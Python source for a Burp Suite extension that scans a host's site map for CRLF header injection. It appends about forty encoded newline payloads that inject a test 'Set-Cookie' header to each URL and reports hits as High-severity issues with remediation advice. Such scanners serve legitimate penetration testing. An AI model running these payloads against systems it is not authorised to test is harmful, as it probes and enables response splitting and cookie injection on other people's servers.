# -*- coding: utf-8 -*-
from burp import IBurpExtender, IContextMenuFactory, IScanIssue
from java.util import ArrayList
from java.net import URL
from javax.swing import JMenuItem
import threading
import re

class CustomScanIssue(IScanIssue):
    def __init__(self, http_service, url, http_messages, issue_name, issue_detail, severity):
        self._http_service = http_service
        self._url = url
        self._http_messages = http_messages
        self._issue_name = issue_name
        self._issue_detail = issue_detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._issue_name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return ("This issue was detected by the CRLF Scanner extension, "
                "which injects various payloads to check for CRLF injection vulnerabilities.")

    def getRemediationBackground(self):
        return ("Validate and sanitize user inputs to prevent CRLF injection. "
                "Properly encode or reject unexpected newline characters in headers.")

    def getIssueDetail(self):
        return self._issue_detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self._http_messages

    def getHttpService(self):
        return self._http_service

class BurpExtender(IBurpExtender, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("CRLF Scanner")
        self._callbacks.registerContextMenuFactory(self)

        self.payloads = [
            "%00Set-Cookie:param=6h4ack",
            "%0aSet-Cookie:param=6h4ack",
            "%0a%20Set-Cookie:param=6h4ack",
            "%0dSet-Cookie:param=6h4ack",
            "%0d%09Set-Cookie:param=6h4ack",
            "%0d%0aSet-Cookie:param=6h4ack",
            "%0d%0a%09Set-Cookie:param=6h4ack",
            "%0d%0a%20Set-Cookie:param=6h4ack",
            "%0d%20Set-Cookie:param=6h4ack",
            "%20Set-Cookie:param=6h4ack",
            "%20%0aSet-Cookie:param=6h4ack",
            "%20%0dSet-Cookie:param=6h4ack",
            "%20%0d%0aSet-Cookie:param=6h4ack",
            "%23%0aSet-Cookie:param=6h4ack",
            "%23%0a%20Set-Cookie:param=6h4ack",
            "%23%0dSet-Cookie:param=6h4ack",
            "%23%0d%0aSet-Cookie:param=6h4ack",
            "%25%30Set-Cookie:param=6h4ack",
            "%25%30%61Set-Cookie:param=6h4ack",
            "%2e%2e%2f%0d%0aSet-Cookie:param=6h4ack",
            "%2f%2e%2e%0d%0aSet-Cookie:param=6h4ack",
            "%2f..%0d%0aSet-Cookie:param=6h4ack",
            "%3fSet-Cookie:param=6h4ack",
            "%3f%0aSet-Cookie:param=6h4ack",
            "%3f%0dSet-Cookie:param=6h4ack",
            "%3f%0d%0aSet-Cookie:param=6h4ack",
            "%e5%98%8a%e5%98%8dSet-Cookie:param=6h4ack",
            "%e5%98%8a%e5%98%8d%0aSet-Cookie:param=6h4ack",
            "%e5%98%8a%e5%98%8d%0dSet-Cookie:param=6h4ack",
            "%e5%98%8a%e5%98%8d%0d%0aSet-Cookie:param=6h4ack",
            "%u0000Set-Cookie:param=6h4ack",
            "%u000aSet-Cookie:param=6h4ack",
            "%u000dSet-Cookie:param=6h4ack",
            "\rSet-Cookie:param=6h4ack",
            "\r%20Set-Cookie:param=6h4ack",
            "\nSet-Cookie:param=6h4ack",
            "\n%20Set-Cookie:param=6h4ack",
            "\n\tSet-Cookie:param=6h4ack",
            "\r\tSet-Cookie:param=6h4ack"
        ]

    def createMenuItems(self, invocation):
        menu = ArrayList()
        selected_messages = invocation.getSelectedMessages()

        if selected_messages:
            menu_item = JMenuItem("Scan CRLF Injection on Host", actionPerformed=lambda x: self.startScanThread(selected_messages[0]))
            menu.add(menu_item)

        return menu

    def startScanThread(self, base_request_response):
        t = threading.Thread(target=self.runScan, args=(base_request_response,))
        t.start()

    def runScan(self, base_request_response):
        try:
            http_service = base_request_response.getHttpService()
            host = http_service.getHost()

            full_site_map = self._callbacks.getSiteMap(None)
            site_map_items = [item for item in full_site_map if item.getHttpService().getHost() == host]

            scanned = set()
            self._callbacks.printOutput("Starting CRLF scan on: {}".format(host))

            pattern = re.compile(r'^Set-Cookie:\s*param=6h4ack\b', re.IGNORECASE)

            for item in site_map_items:
                request_info = self._helpers.analyzeRequest(item)
                original_url = request_info.getUrl()
                original_url_str = str(original_url)

                if original_url_str in scanned:
                    continue
                scanned.add(original_url_str)

                for payload in self.payloads:
                    try:
                        test_url_str = original_url_str.rstrip("/") + "/" + payload
                        test_url = URL(test_url_str)
                        request = self._helpers.buildHttpRequest(test_url)
                        response = self._callbacks.makeHttpRequest(http_service, request)
                        analyzed_response = self._helpers.analyzeResponse(response.getResponse())
                        headers = analyzed_response.getHeaders()

                        self._callbacks.printOutput("Scanned: {}".format(test_url_str))

                        for header in headers:
                            if pattern.match(header):
                                self._callbacks.printOutput("[!] CRLF injection SUCCESS on: {}".format(test_url_str))
                                self._callbacks.issueAlert("CRLF injection found at: " + test_url_str)

                                issue = CustomScanIssue(
                                    http_service,
                                    test_url,
                                    [response],
                                    "CRLF Injection Vulnerability",
                                    "The server reflects the injected payload in response headers, indicating a CRLF Injection at: {}".format(test_url_str),
                                    "High"
                                )
                                self._callbacks.addScanIssue(issue)
                                break
                    except Exception as e:
                        self._callbacks.printError("Error scanning {}: {}".format(test_url_str, str(e)))

            self._callbacks.printOutput("Scan finished for: {}".format(host))

        except Exception as e:
            self._callbacks.printError("Fatal scan error: {}".format(str(e)))
